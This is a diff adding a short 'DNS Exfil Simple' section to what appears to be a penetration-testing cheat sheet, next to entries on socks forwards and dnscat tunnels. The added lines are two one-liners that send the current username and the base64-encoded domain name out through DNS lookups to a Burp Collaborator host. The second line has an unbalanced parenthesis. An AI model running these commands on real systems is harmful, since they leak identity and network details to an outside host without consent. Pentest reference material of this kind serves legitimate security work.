@@ -1486,6 +1486,14 @@ PS> Parse-PolFile C:\Users\sysadm\Desktop\Registry.pol
 
 ### Socks & Port Forwards
 
+#### DNS Exfil Simple
+
+```
+> $n=$(whoami);dig "$n.asdf.burpcollab.net"
+
+>  $d=(wmic computersystem get domain);$e=[convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($d);nslookup "$e.asdf.burpcollab.net"
+```
+
 #### DNS Tunnel via dnscat
 
 Start dnscat2-server for tunnel.com
